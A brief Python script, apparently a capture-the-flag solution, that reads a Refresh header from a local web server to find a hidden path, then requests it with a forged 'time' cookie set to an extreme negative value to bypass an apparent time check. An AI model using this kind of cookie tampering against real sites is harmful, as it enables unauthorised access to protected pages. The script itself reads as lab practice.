import requests as http

BASE_URL = "http://localhost:8080"

secret_site = http.get(f"{BASE_URL}").headers.get("Refresh").split("; url=/")[1]

print(http.get(f"{BASE_URL}/{secret_site}", cookies={ 'time': '-1e308' }).text)